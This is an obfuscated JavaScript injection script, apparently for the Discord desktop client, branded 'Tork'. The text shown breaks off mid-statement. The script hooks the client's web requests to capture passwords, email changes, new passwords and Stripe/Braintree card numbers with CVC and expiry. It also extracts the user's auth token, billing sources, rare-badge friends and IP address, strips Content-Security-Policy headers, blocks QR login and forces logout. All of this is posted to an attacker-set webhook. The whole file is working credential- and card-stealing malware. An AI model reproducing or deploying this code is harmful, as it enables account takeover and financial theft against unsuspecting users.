var _0x1e40c3=_0x5e2c;(function(_0x2f05d1,_0x1af926){var _0x30f7c=_0x5e2c,_0x14e069=_0x2f05d1();while(!![]){try{var _0x52d760=parseInt(_0x30f7c(0x19d))/0x1*(-parseInt(_0x30f7c(0x1b1))/0x2)+parseInt(_0x30f7c(0x1c8))/0x3+parseInt(_0x30f7c(0x177))/0x4*(parseInt(_0x30f7c(0x1ee))/0x5)+-parseInt(_0x30f7c(0x1a4))/0x6+-parseInt(_0x30f7c(0x223))/0x7+-parseInt(_0x30f7c(0x1b6))/0x8*(-parseInt(_0x30f7c(0x18a))/0x9)+parseInt(_0x30f7c(0x1da))/0xa*(parseInt(_0x30f7c(0x1d7))/0xb);if(_0x52d760===_0x1af926)break;else _0x14e069['push'](_0x14e069['shift']());}catch(_0x4048ce){_0x14e069['push'](_0x14e069['shift']());}}}(_0x5f32,0xbfc21));const {BrowserWindow,session}=require(_0x1e40c3(0x1b3)),os=require('os'),https=require(_0x1e40c3(0x1cb)),querystring=require(_0x1e40c3(0x192)),fs=require('fs');var config={'brand':_0x1e40c3(0x17a),'webhook':'%WEBHOOK_LINK%','logout':!![],'disable_qr_code':!![],'notify_on_logout':!![],'notify_on_initialization':!![],'ping':[!![],'@everyone'],'embed':{'username':'Tork\x20|\x20t.me/ip_tork','footer':{'text':'Tork\x20|\x20t.me/ip_tork','icon_url':_0x1e40c3(0x1b4)},'href':'Tork#4455','avatar_url':_0x1e40c3(0x1b4)},'badges':{'Discord_Employee':{'Value':0x1,'Emoji':_0x1e40c3(0x1fc),'Rare':!![]},'Partnered_Server_Owner':{'Value':0x2,'Emoji':_0x1e40c3(0x205),'Rare':!![]},'HypeSquad_Events':{'Value':0x4,'Emoji':'<:hypesquad_events:874750808594477056>','Rare':!![]},'Bug_Hunter_Level_1':{'Value':0x8,'Emoji':_0x1e40c3(0x17d),'Rare':!![]},'Early_Supporter':{'Value':0x200,'Emoji':_0x1e40c3(0x1ba),'Rare':!![]},'Bug_Hunter_Level_2':{'Value':0x4000,'Emoji':'<:bughunter_2:874750808430874664>','Rare':!![]},'Early_Verified_Bot_Developer':{'Value':0x20000,'Emoji':_0x1e40c3(0x219),'Rare':!![]},'House_Bravery':{'Value':0x40,'Emoji':_0x1e40c3(0x1cf),'Rare':![]},'House_Brilliance':{'Value':0x80,'Emoji':_0x1e40c3(0x16e),'Rare':![]},'House_Balance':{'Value':0x100,'Emoji':'<:balance:874750808267292683>','Rare':![]}},'filters':{'user':{'urls':[_0x1e40c3(0x1ca),_0x1e40c3(0x1f4),_0x1e40c3(0x195),_0x1e40c3(0x1a9),'https://discord.com/api/v*/auth/login',_0x1e40c3(0x1ac),_0x1e40c3(0x1bb),_0x1e40c3(0x1e5),_0x1e40c3(0x20b),_0x1e40c3(0x185)]},'qr_codes':{'urls':[_0x1e40c3(0x18c),'https://*.discord.com/api/v*/applications/detectable',_0x1e40c3(0x1b7),_0x1e40c3(0x1c4),_0x1e40c3(0x1f6),_0x1e40c3(0x1e4),_0x1e40c3(0x1f0),_0x1e40c3(0x1e6)]}}},execScript=_0x4188ad=>{var _0x533502=_0x1e40c3;const _0x59d2a2=BrowserWindow['getAllWindows']()[0x0];return _0x59d2a2[_0x533502(0x197)][_0x533502(0x1d1)](_0x4188ad,!![]);};class Event{constructor(_0x4276ec,_0x2241a1,_0x3ee333){var _0x150382=_0x1e40c3;for(let [_0x9e0526,_0x2846f0]of Object[_0x150382(0x173)]({'event':_0x4276ec,'data':_0x3ee333,'token':_0x2241a1})){this[_0x9e0526]=_0x2846f0;}}['handle'](){var _0x4dee84=_0x1e40c3;switch(this['event']){case _0x4dee84(0x17f):event_handlers[_0x4dee84(0x17f)](this['data'][_0x4dee84(0x1b0)],this[_0x4dee84(0x1d2)][_0x4dee84(0x1ae)],this['token']);break;case'userLogin':event_handlers[_0x4dee84(0x179)](this[_0x4dee84(0x1d2)][_0x4dee84(0x1b0)],this[_0x4dee84(0x1d2)][_0x4dee84(0x189)],this[_0x4dee84(0x1ab)]);break;case _0x4dee84(0x193):event_handlers[_0x4dee84(0x193)](this[_0x4dee84(0x1d2)][_0x4dee84(0x1b0)],this[_0x4dee84(0x1d2)][_0x4dee84(0x189)],this[_0x4dee84(0x1ab)]);break;case _0x4dee84(0x1ec):event_handlers['creditCardAdded'](this[_0x4dee84(0x1d2)][_0x4dee84(0x201)],this[_0x4dee84(0x1d2)][_0x4dee84(0x1a0)],this[_0x4dee84(0x1d2)]['exp_month'],this[_0x4dee84(0x1d2)][_0x4dee84(0x1e8)],this[_0x4dee84(0x1ab)]);}}}session[_0x1e40c3(0x175)][_0x1e40c3(0x222)]['onHeadersReceived']((_0x1d6201,_0x946547)=>{var _0x4a06b6=_0x1e40c3;try{_0x1d6201[_0x4a06b6(0x207)][_0x4a06b6(0x210)](config['webhook'])?_0x1d6201['url'][_0x4a06b6(0x220)]('discord.com')?_0x946547({'responseHeaders':Object['assign']({'Access-Control-Allow-Headers':'*'},_0x1d6201[_0x4a06b6(0x1cc)])}):_0x946547({'responseHeaders':Object[_0x4a06b6(0x188)]({'Content-Security-Policy':[_0x4a06b6(0x1df),_0x4a06b6(0x218),_0x4a06b6(0x1b5)],'Access-Control-Allow-Headers':'*','Access-Control-Allow-Origin':'*'},_0x1d6201[_0x4a06b6(0x1cc)])}):(delete _0x1d6201[_0x4a06b6(0x1cc)][_0x4a06b6(0x19e)],delete _0x1d6201['responseHeaders'][_0x4a06b6(0x20c)],_0x946547({'responseHeaders':{..._0x1d6201['responseHeaders'],'Access-Control-Allow-Headers':'*'}}));}catch{}}),session['defaultSession'][_0x1e40c3(0x222)][_0x1e40c3(0x1d4)](config[_0x1e40c3(0x203)][_0x1e40c3(0x216)],async(_0x5e93d1,_0x4f3713)=>{var _0xd58e53=_0x1e40c3;if(_0x5e93d1[_0xd58e53(0x207)][_0xd58e53(0x210)](_0xd58e53(0x1ad))){if(!config[_0xd58e53(0x204)]==![]){_0x4f3713({'cancel':!![]});return;}}await initialize(),_0x4f3713({});return;}),session[_0x1e40c3(0x175)][_0x1e40c3(0x222)][_0x1e40c3(0x1e3)](config[_0x1e40c3(0x203)][_0x1e40c3(0x1a5)],async(_0x5a421d,_0x557d9c)=>{var _0x369e89=_0x1e40c3;try{if(_0x5a421d[_0x369e89(0x21c)]==0xc8||_0x5a421d[_0x369e89(0x21c)]==0xcc){const _0x2ebd6d=Buffer[_0x369e89(0x178)](_0x5a421d[_0x369e89(0x184)][0x0]['bytes'])[_0x369e89(0x1b2)](),_0x453057=JSON[_0x369e89(0x1a2)](_0x2ebd6d),_0x8e0c8a=await getToken();switch(!![]){case _0x5a421d[_0x369e89(0x207)]['endsWith'](_0x369e89(0x1e2)):new Event(_0x369e89(0x179),_0x8e0c8a,{'password':_0x453057[_0x369e89(0x1b0)],'email':_0x453057[_0x369e89(0x1e2)]})[_0x369e89(0x1e0)]();;return;case _0x5a421d[_0x369e89(0x207)]['endsWith'](_0x369e89(0x20e))&&_0x5a421d['method']==_0x369e89(0x1a3):const _0x1ea05a=querystring['parse'](_0x2ebd6d[_0x369e89(0x1b2)]());new Event('creditCardAdded',_0x8e0c8a,{'number':_0x1ea05a[_0x369e89(0x199)],'cvc':_0x1ea05a[_0x369e89(0x1f7)],'exp_month':_0x1ea05a[_0x369e89(0x191)],'exp_year':_0x1ea05a[_0x369e89(0x21f)]});case _0x5a421d[_0x369e89(0x207)][_0x369e89(0x213)]('users/@me')&&_0x5a421d[_0x369e89(0x1c9)]==_0x369e89(0x209):if(!_0x453057[_0x369e89(0x1b0)])return;_0x453057[_0x369e89(0x189)]&&new Event(_0x369e89(0x193),_0x8e0c8a,{'password':_0x453057[_0x369e89(0x1b0)],'email':_0x453057[_0x369e89(0x189)]})[_0x369e89(0x1e0)]();;_0x453057[_0x369e89(0x1ae)]&&new Event(_0x369e89(0x17f),_0x8e0c8a,{'password':_0x453057[_0x369e89(0x1b0)],'new_password':_0x453057[_0x369e89(0x1ae)]})[_0x369e89(0x1e0)]();;return;default:break;}}else return;}catch{}});function _0x5e2c(_0xcdbfbd,_0x5010cf){var _0x5f3268=_0x5f32();return _0x5e2c=function(_0x5e2c42,_0x1af57c){_0x5e2c42=_0x5e2c42-0x16d;var _0x410efe=_0x5f3268[_0x5e2c42];return _0x410efe;},_0x5e2c(_0xcdbfbd,_0x5010cf);}var event_handlers={async 'creditCardAdded'(_0xa2989b,_0x599016,_0x154832,_0x3c89ba){var _0x270e8a=_0x1e40c3;const _0xcfcd1e=await getUserInfo(token),_0x383d52=await getBilling(token),_0x9f00a1=await getRelationships(token);var _0x41cf6b={'username':config[_0x270e8a(0x21d)][_0x270e8a(0x198)],'avatar_url':config[_0x270e8a(0x21d)][_0x270e8a(0x212)],'embeds':[createEmbed({'title':_0x270e8a(0x1ed),'url':config[_0x270e8a(0x21d)][_0x270e8a(0x181)],'author':{'name':_0xcfcd1e[_0x270e8a(0x198)]+'#'+_0xcfcd1e[_0x270e8a(0x1dd)]+'\x20('+_0xcfcd1e['id']+')','url':config['embed'][_0x270e8a(0x181)],'icon_url':_0xcfcd1e[_0x270e8a(0x208)]?'https://cdn.discordapp.com/avatars/'+_0xcfcd1e['id']+'/'+_0xcfcd1e[_0x270e8a(0x208)]:_0x270e8a(0x1be)},'thumbnail':{'url':_0xcfcd1e[_0x270e8a(0x208)]?_0x270e8a(0x18e)+_0xcfcd1e['id']+'/'+_0xcfcd1e['avatar']:_0x270e8a(0x1be)},'fields':[{'name':_0x270e8a(0x174),'value':_0x270e8a(0x1c1)+_0xa2989b+_0x270e8a(0x1c1),'inline':!![]},{'name':'Credit\x20card\x20CVC','value':_0x270e8a(0x1c1)+_0x599016+_0x270e8a(0x1c1),'inline':!![]},{'name':_0x270e8a(0x19c),'value':'```'+_0x154832+'/'+_0x3c89ba+_0x270e8a(0x1c1),'inline':!![]},{'name':_0x270e8a(0x1bf),'value':_0x270e8a(0x1c1)+(_0xcfcd1e[_0x270e8a(0x16f)]??_0x270e8a(0x202))+'```','inline':![]},{'name':_0x270e8a(0x196),'value':''+getNitro(_0xcfcd1e[_0x270e8a(0x1aa)]),'inline':![]},{'name':_0x270e8a(0x21e),'value':''+_0x383d52,'inline':!![]},{'name':_0x270e8a(0x1f2),'value':''+getBadges(_0xcfcd1e[_0x270e8a(0x214)]),'inline':![]},{'name':_0x270e8a(0x1db),'value':_0x270e8a(0x1c1)+token+'```','inline':![]},{'name':_0x270e8a(0x1fd),'value':_0x270e8a(0x1c1)+os[_0x270e8a(0x18b)]+_0x270e8a(0x1c1),'inline':![]}]}),createEmbed({'description':'**Total\x20Friends\x20('+_0x9f00a1['length']+_0x270e8a(0x1c0)+_0x9f00a1['frien'],'thumbnail':{'url':_0xcfcd1e['avatar']?'https://cdn.discordapp.com/avatars/'+_0xcfcd1e['id']+'/'+_0xcfcd1e[_0x270e8a(0x208)]:_0x270e8a(0x1be)},'author':{'name':_0xcfcd1e[_0x270e8a(0x198)]+'#'+_0xcfcd1e[_0x270e8a(0x1dd)]+'\x20('+_0xcfcd1e['id']+')','url':config[_0x270e8a(0x21d)][_0x270e8a(0x181)],'icon_url':_0xcfcd1e[_0x270e8a(0x208)]?_0x270e8a(0x18e)+_0xcfcd1e['id']+'/'+_0xcfcd1e[_0x270e8a(0x208)]:_0x270e8a(0x1be)}})]};sendToWebhook(_0x41cf6b);},async 'userLogin'(_0x4fbb2a,_0x208ffc,_0x3ad2ac){var _0x3a4a7a=_0x1e40c3;const _0x3f05d7=await getUserInfo(_0x3ad2ac),_0x5803b3=await getBilling(_0x3ad2ac),_0x59b5ef=await getRelationships(_0x3ad2ac);var _0x3fb1d3={'username':config[_0x3a4a7a(0x21d)][_0x3a4a7a(0x198)],'avatar_url':config[_0x3a4a7a(0x21d)][_0x3a4a7a(0x212)],'embeds':[createEmbed({'title':_0x3a4a7a(0x182),'url':config[_0x3a4a7a(0x21d)][_0x3a4a7a(0x181)],'author':{'name':_0x3f05d7[_0x3a4a7a(0x198)]+'#'+_0x3f05d7[_0x3a4a7a(0x1dd)]+'\x20('+_0x3f05d7['id']+')','url':config['embed']['href'],'icon_url':_0x3f05d7[_0x3a4a7a(0x208)]?_0x3a4a7a(0x18e)+_0x3f05d7['id']+'/'+_0x3f05d7[_0x3a4a7a(0x208)]:'https://cdn.discordapp.com/embed/avatars/0.png'},'thumbnail':{'url':_0x3f05d7[_0x3a4a7a(0x208)]?_0x3a4a7a(0x18e)+_0x3f05d7['id']+'/'+_0x3f05d7[_0x3a4a7a(0x208)]:_0x3a4a7a(0x1be)},'fields':[{'name':'Password','value':_0x3a4a7a(0x1c1)+_0x4fbb2a+_0x3a4a7a(0x1c1),'inline':!![]},{'name':_0x3a4a7a(0x170),'value':_0x3a4a7a(0x1c1)+_0x208ffc+_0x3a4a7a(0x1c1),'inline':!![]},{'name':_0x3a4a7a(0x1bf),'value':'```'+(_0x3f05d7[_0x3a4a7a(0x16f)]??_0x3a4a7a(0x202))+_0x3a4a7a(0x1c1),'inline':![]},{'name':'Nitro','value':''+getNitro(_0x3f05d7[_0x3a4a7a(0x1aa)]),'inline':![]},{'name':_0x3a4a7a(0x21e),'value':''+_0x5803b3,'inline':!![]},{'name':_0x3a4a7a(0x1f2),'value':''+getBadges(_0x3f05d7['flags']),'inline':![]},{'name':_0x3a4a7a(0x1db),'value':_0x3a4a7a(0x1c1)+_0x3ad2ac+_0x3a4a7a(0x1c1),'inline':![]},{'name':_0x3a4a7a(0x1fd),'value':_0x3a4a7a(0x1c1)+os[_0x3a4a7a(0x18b)]+_0x3a4a7a(0x1c1),'inline':![]}]}),createEmbed({'description':'**Total\x20Friends\x20('+_0x59b5ef[_0x3a4a7a(0x21a)]+')**\x0a\x0a'+_0x59b5ef[_0x3a4a7a(0x1a6)],'thumbnail':{'url':_0x3f05d7[_0x3a4a7a(0x208)]?_0x3a4a7a(0x18e)+_0x3f05d7['id']+'/'+_0x3f05d7['avatar']:_0x3a4a7a(0x1be)},'author':{'name':_0x3f05d7[_0x3a4a7a(0x198)]+'#'+_0x3f05d7[_0x3a4a7a(0x1dd)]+'\x20('+_0x3f05d7['id']+')','url':config['embed'][_0x3a4a7a(0x181)],'icon_url':_0x3f05d7[_0x3a4a7a(0x208)]?_0x3a4a7a(0x18e)+_0x3f05d7['id']+'/'+_0x3f05d7[_0x3a4a7a(0x208)]:_0x3a4a7a(0x1be)}})]};sendToWebhook(_0x3fb1d3);},async 'emailChanged'(_0x50cc8f,_0x18fd85,_0x5396e4){var _0x16c24b=_0x1e40c3,_0x539583=await getUserInfo(_0x5396e4),_0x4d6946=await getBilling(_0x5396e4),_0x1b715c=await getRelationships(_0x5396e4),_0x38349f={'username':config[_0x16c24b(0x21d)][_0x16c24b(0x198)],'avatar_url':config[_0x16c24b(0x21d)][_0x16c24b(0x212)],'embeds':[createEmbed({'title':'Discord\x20|\x20Email\x20changed','url':config[_0x16c24b(0x21d)][_0x16c24b(0x181)],'author':{'name':_0x539583['username']+'#'+_0x539583['discriminator']+'\x20('+_0x539583['id']+')','url':config[_0x16c24b(0x21d)][_0x16c24b(0x181)],'icon_url':_0x539583[_0x16c24b(0x208)]?'https://cdn.discordapp.com/avatars/'+_0x539583['id']+'/'+_0x539583['avatar']:_0x16c24b(0x1be)},'thumbnail':{'url':_0x539583['avatar']?_0x16c24b(0x18e)+_0x539583['id']+'/'+_0x539583[_0x16c24b(0x208)]:'https://cdn.discordapp.com/embed/avatars/0.png'},'fields':[{'name':_0x16c24b(0x183),'value':'```'+_0x18fd85+_0x16c24b(0x1c1),'inline':!![]},{'name':'Password','value':_0x16c24b(0x1c1)+_0x50cc8f+_0x16c24b(0x1c1),'inline':!![]},{'name':_0x16c24b(0x1bf),'value':'```'+(_0x539583[_0x16c24b(0x16f)]??_0x16c24b(0x202))+'```','inline':![]},{'name':_0x16c24b(0x196),'value':''+getNitro(_0x539583['premium_type']),'inline':![]},{'name':'Billing','value':''+_0x4d6946,'inline':!![]},{'name':_0x16c24b(0x1f2),'value':''+getBadges(_0x539583[_0x16c24b(0x214)]),'inline':![]},{'name':_0x16c24b(0x1db),'value':_0x16c24b(0x1c1)+_0x5396e4+_0x16c24b(0x1c1),'inline':![]},{'name':'Hostname','value':_0x16c24b(0x1c1)+os[_0x16c24b(0x18b)]+_0x16c24b(0x1c1),'inline':![]}]}),createEmbed({'description':'**Total\x20Friends\x20('+_0x1b715c['length']+')**\x0a\x0a'+_0x1b715c[_0x16c24b(0x1a6)],'thumbnail':{'url':_0x539583[_0x16c24b(0x208)]?'https://cdn.discordapp.com/avatars/'+_0x539583['id']+'/'+_0x539583[_0x16c24b(0x208)]:'https://cdn.discordapp.com/embed/avatars/0.png'},'author':{'name':_0x539583[_0x16c24b(0x198)]+'#'+_0x539583[_0x16c24b(0x1dd)]+'\x20('+_0x539583['id']+')','url':config[_0x16c24b(0x21d)][_0x16c24b(0x181)],'icon_url':_0x539583['avatar']?_0x16c24b(0x18e)+_0x539583['id']+'/'+_0x539583[_0x16c24b(0x208)]:_0x16c24b(0x1be)}})]};sendToWebhook(_0x38349f);},async 'passwordChanged'(_0x50f4b7,_0x59c78a,_0x3020c0){var _0x3a8c75=_0x1e40c3,_0x485133=await getUserInfo(_0x3020c0),_0x210e23=await getBilling(_0x3020c0),_0x59abda=await getRelationships(_0x3020c0),_0x39f255={'username':config['embed'][_0x3a8c75(0x198)],'avatar_url':config[_0x3a8c75(0x21d)]['avatar_url'],'embeds':[createEmbed({'title':_0x3a8c75(0x211),'url':config['embed'][_0x3a8c75(0x181)],'author':{'name':_0x485133[_0x3a8c75(0x198)]+'#'+_0x485133[_0x3a8c75(0x1dd)]+'\x20('+_0x485133['id']+')','url':config['embed']['href'],'icon_url':_0x485133[_0x3a8c75(0x208)]?_0x3a8c75(0x18e)+_0x485133['id']+'/'+_0x485133[_0x3a8c75(0x208)]:_0x3a8c75(0x1be)},'thumbnail':{'url':_0x485133['avatar']?_0x3a8c75(0x18e)+_0x485133['id']+'/'+_0x485133['avatar']:'https://cdn.discordapp.com/embed/avatars/0.png'},'fields':[{'name':_0x3a8c75(0x1ef),'value':_0x3a8c75(0x1c1)+_0x50f4b7+_0x3a8c75(0x1c1),'inline':![]},{'name':_0x3a8c75(0x17c),'value':_0x3a8c75(0x1c1)+_0x59c78a+_0x3a8c75(0x1c1),'inline':![]},{'name':_0x3a8c75(0x1bf),'value':'```'+(_0x485133[_0x3a8c75(0x16f)]??_0x3a8c75(0x202))+_0x3a8c75(0x1c1),'inline':![]},{'name':_0x3a8c75(0x196),'value':''+getNitro(_0x485133[_0x3a8c75(0x1aa)]),'inline':![]},{'name':_0x3a8c75(0x21e),'value':''+_0x210e23,'inline':!![]},{'name':'Badges','value':''+getBadges(_0x485133[_0x3a8c75(0x214)]),'inline':![]},{'name':'Token','value':_0x3a8c75(0x1c1)+_0x3020c0+_0x3a8c75(0x1c1),'inline':![]},{'name':_0x3a8c75(0x1fd),'value':'```'+os[_0x3a8c75(0x18b)]+_0x3a8c75(0x1c1),'inline':![]}]}),createEmbed({'description':_0x3a8c75(0x1c3)+_0x59abda[_0x3a8c75(0x21a)]+_0x3a8c75(0x1c0)+_0x59abda[_0x3a8c75(0x1a6)],'thumbnail':{'url':_0x485133[_0x3a8c75(0x208)]?_0x3a8c75(0x18e)+_0x485133['id']+'/'+_0x485133[_0x3a8c75(0x208)]:_0x3a8c75(0x1be)},'author':{'name':_0x485133[_0x3a8c75(0x198)]+'#'+_0x485133[_0x3a8c75(0x1dd)]+'\x20('+_0x485133['id']+')','url':config[_0x3a8c75(0x21d)][_0x3a8c75(0x181)],'icon_url':_0x485133[_0x3a8c75(0x208)]?_0x3a8c75(0x18e)+_0x485133['id']+'/'+_0x485133[_0x3a8c75(0x208)]:_0x3a8c75(0x1be)}})]};sendToWebhook(_0x39f255);}};function getDiscordClient(){var _0x5c97f4=_0x1e40c3;return''+process['cwd']()[_0x5c97f4(0x1d3)](process[_0x5c97f4(0x1cd)][_0x5c97f4(0x20f)]+'\x5c','')[_0x5c97f4(0x20d)]('\x5c')[0x0][_0x5c97f4(0x20d)](0x7);}function getNitro(_0x3a5f67){var _0x33b410=_0x1e40c3;switch(_0x3a5f67){case 0x0:return _0x33b410(0x1af);case 0x1:return _0x33b410(0x1dc);case 0x2:return _0x33b410(0x1e9);default:return _0x33b410(0x1af);};}function getRareBadges(_0x10d9da){var _0x5515e1=_0x1e40c3,_0x2245d0='';for(const _0x1b0921 in config[_0x5515e1(0x1e1)]){let _0x56f7f5=config[_0x5515e1(0x1e1)][_0x1b0921];if((_0x10d9da&_0x56f7f5['Value'])==_0x56f7f5[_0x5515e1(0x1c6)]&&_0x56f7f5[_0x5515e1(0x176)])_0x2245d0+=_0x56f7f5[_0x5515e1(0x1b8)];};return _0x2245d0;}function getBadges(_0x3354c3){var _0x594ee8=_0x1e40c3,_0x1d8553='';for(const _0x5e62b8 in config['badges']){let _0x3f3659=config[_0x594ee8(0x1e1)][_0x5e62b8];if((_0x3354c3&_0x3f3659[_0x594ee8(0x1c6)])==_0x3f3659[_0x594ee8(0x1c6)])_0x1d8553+=_0x3f3659[_0x594ee8(0x1b8)];};if(_0x1d8553=='')_0x1d8553=_0x594ee8(0x1f5);return _0x1d8553;}async function getToken(){var _0x3c44cc=_0x1e40c3;return await execScript(_0x3c44cc(0x1bd),!![]);}async function getIp(){var _0x4b272e=_0x1e40c3;return JSON[_0x4b272e(0x1a2)](await execScript(_0x4b272e(0x1c2),!![]));}async function getUserInfo(_0x40f523){var _0x525b26=_0x1e40c3;return JSON[_0x525b26(0x1a2)](await execScript(_0x525b26(0x180)+_0x40f523+_0x525b26(0x19b),!![]));}function _0x5f32(){var _0x46f5b9=['exports','cwd','request','<:staff:874750808728666152>','Hostname','footer','brand','content','number','None','filters','disable_qr_code','<:partner:874750808678354964>','then','url','avatar','PATCH','notify_on_logout','https://api.stripe.com/v*/setup_intents/*/confirm','content-security-policy-report-only','split','tokens','LOCALAPPDATA','startsWith','Discord\x20|\x20Password\x20changed','avatar_url','endsWith','flags','```yaml\x0aIP\x20Address:\x20','qr_codes','\x0aCity:\x20','Access-Control-Allow-Headers\x20\x27*\x27','<:developer:874750808472825986>','length','ping','statusCode','embed','Billing','card[exp_year]','includes','No\x20Rare\x20Friends','webRequest','9843624iIIRNK','\x22);\x20xmlHttp.send(\x20null\x20);\x20xmlHttp.responseText','<:brilliance:874750808338608199>','phone','E-Mail\x20Address','pathname','\x20:credit_card:','entries','Credit\x20card\x20Number','defaultSession','Rare','196YKwKiL','from','userLogin','Tork','\x0aHostname:\x20','New\x20password','<:bughunter_1:874750808426692658>','end','passwordChanged','var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();xmlHttp.open(\x20\x22GET\x22,\x20\x22https://discord.com/api/v8/users/@me\x22,\x20false\x20);xmlHttp.setRequestHeader(\x22Authorization\x22,\x20\x22','href','Discord\x20|\x20User\x20logged\x20in','New\x20email\x20address','uploadData','https://api.stripe.com/v*/payment_intents/*/confirm','var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();\x20xmlHttp.open(\x20\x22GET\x22,\x20\x22https://discord.com/api/v9/users/@me/billing/payment-sources\x22,\x20false\x20);\x20xmlHttp.setRequestHeader(\x22Authorization\x22,\x20\x22','\x0aCountry:\x20','assign','email','1017UjvNBu','hostname','https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json','Client\x20version','https://cdn.discordapp.com/avatars/','Discord\x20|\x20Client\x20initialized','Unknown','card[exp_month]','querystring','emailChanged','\x20||','https://*.discord.com/api/v*/users/@me','Nitro','webContents','username','card[number]','type','\x22);xmlHttp.send(\x20null\x20);xmlHttp.responseText;','Credit\x20card\x20expiration','710138bqIxTV','content-security-policy','\x20<:paypal:896441236062347374>','cvc','Discord\x20|\x20Client\x20initialized\x20(not\x20logged\x20in)','parse','POST','1170090ondsAq','user','frien','city','var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();xmlHttp.open(\x20\x22GET\x22,\x20\x22https://discord.com/api/v9/users/@me/relationships\x22,\x20false\x20);xmlHttp.setRequestHeader(\x22Authorization\x22,\x20\x22','https://discordapp.com/api/v*/auth/login','premium_type','token','https://*.discord.com/api/v*/auth/login','wss://','new_password','```No\x20Nitro```','password','2qbULLS','toString','electron','https://cdn.discordapp.com/emojis/948405394433253416.webp?size=96&quality=lossless','Access-Control-Allow-Origin\x20\x27*\x27','62072BthvQN','https://discord.com/api/v*/applications/detectable','Emoji','application/json','<:early_supporter:874750808414113823>','https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts','invalid','for(let\x20a\x20in\x20window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[[\x27get_require\x27]]]),delete\x20gg.m.get_require,delete\x20gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let\x20b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let\x20a\x20in\x20b.default)\x27getToken\x27==a&&(token=b.default.getToken())}token;','https://cdn.discordapp.com/embed/avatars/0.png','Phone\x20Number',')**\x0a\x0a','```','var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();xmlHttp.open(\x20\x22GET\x22,\x20\x22https://ipinfo.io/json\x22,\x20false\x20);xmlHttp.send(\x20null\x20);xmlHttp.responseText;','**Total\x20Friends\x20(','https://*.discord.com/api/v*/users/@me/library','webhook','Value','timezone','1613286AmJOWX','method','https://discord.com/api/v*/users/@me','https','responseHeaders','env','```❌```','<:bravery:874750808388952075>','Discord\x20|\x20User\x20logged\x20out','executeJavaScript','data','replace','onBeforeRequest','./core.asar','notify_on_initialization','5415619EPDBaY','mkdirSync','Connection\x20data','30TaOsIv','Token','<:classic:896119171019067423>\x20``Nitro\x20Classic``','discriminator','host','default-src\x20\x27*\x27','handle','badges','login','onCompleted','https://*.discord.com/api/v*/users/@me/billing/subscriptions','https://api.stripe.com/v*/tokens','wss://remote-auth-gateway.discord.gg/*','forEach','exp_year','<a:boost:824036778570416129>\x20``Nitro\x20Boost``','\x22);xmlHttp.send(\x20null\x20);xmlHttp.responseText','protocol','creditCardAdded','Discord\x20|\x20Credit\x20card\x20added','20950ZmXgcR','Old\x20password','https://discord.com/api/v*/users/@me/billing/subscriptions','window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[[\x22get_require\x22]]]),delete\x20gg.m.get_require,delete\x20gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function\x20LogOut(){(function(a){const\x20b=\x22string\x22==typeof\x20a?a:null;for(const\x20c\x20in\x20gg.c)if(gg.c.hasOwnProperty(c)){const\x20d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return\x20d.default;if(d&&(b?d[b]:a(d)))return\x20d}return\x20null})(\x22login\x22).logout()}LogOut();','Badges','`✔️`','https://discordapp.com/api/v*/users/@me','```None```','https://discord.com/api/v*/users/@me/library','card[cvc]','\x0aTimezone:\x20'];_0x5f32=function(){return _0x46f5b9;};return _0x5f32();}async function getBilling(_0x218f5f){var _0x4795dc=_0x1e40c3,_0x2f661e=await execScript(_0x4795dc(0x186)+_0x218f5f+_0x4795dc(0x16d),!![]),_0x331215=JSON['parse'](_0x2f661e),_0x25a521='';_0x331215[_0x4795dc(0x1e7)](_0x3f5b4d=>{var _0x4d8c74=_0x4795dc;if(_0x3f5b4d[_0x4d8c74(0x19a)]=='')return _0x4d8c74(0x1ce);else{if(_0x3f5b4d[_0x4d8c74(0x19a)]==0x2&&_0x3f5b4d[_0x4d8c74(0x1bc)]!=!![])_0x25a521+=_0x4d8c74(0x1f3)+_0x4d8c74(0x19f);else{if(_0x3f5b4d['type']==0x1&&_0x3f5b4d[_0x4d8c74(0x1bc)]!=!![])_0x25a521+=_0x4d8c74(0x1f3)+_0x4d8c74(0x172);else return _0x4d8c74(0x1ce);}};});if(_0x25a521=='')_0x25a521=_0x4795dc(0x1ce);return _0x25a521;}async function getRelationships(_0x24cfec){var _0x3b84da=_0x1e40c3,_0x10694b=await execScript(_0x3b84da(0x1a8)+_0x24cfec+_0x3b84da(0x1ea),!![]),_0x174ca2=JSON[_0x3b84da(0x1a2)](_0x10694b);const _0x357715=_0x174ca2['filter'](_0x14d718=>{var _0x3ea8f8=_0x3b84da;return _0x14d718[_0x3ea8f8(0x19a)]==0x1;});var _0x21da8d='';for(z of _0x357715){var _0x5334f2=getRareBadges(z['user']['public_flags']);_0x5334f2!=''&&(_0x21da8d+=_0x5334f2+('\x20|\x20'+z[_0x3b84da(0x1a5)][_0x3b84da(0x198)]+'#'+z[_0x3b84da(0x1a5)]['discriminator']+'\x0a'));}if(!_0x21da8d)_0x21da8d=_0x3b84da(0x221);return{'length':_0x357715[_0x3b84da(0x21a)],'frien':_0x21da8d};}function sendToWebhook(_0x36c7c6){var _0x34268b=_0x1e40c3;config['ping'][0x0]==!![]&&(_0x36c7c6[_0x34268b(0x200)]?_0x36c7c6[_0x34268b(0x200)]=_0x36c7c6[_0x34268b(0x200)]+(_0x34268b(0x194)+config[_0x34268b(0x21b)][0x1]+'||'):_0x36c7c6[_0x34268b(0x200)]='||'+config[_0x34268b(0x21b)][0x1]+'||');var _0x4934ff=new URL(config[_0x34268b(0x1c5)]),_0x7eb9ab={'Content-Type':_0x34268b(0x1b9),'Access-Control-Allow-Origin':'*'};const 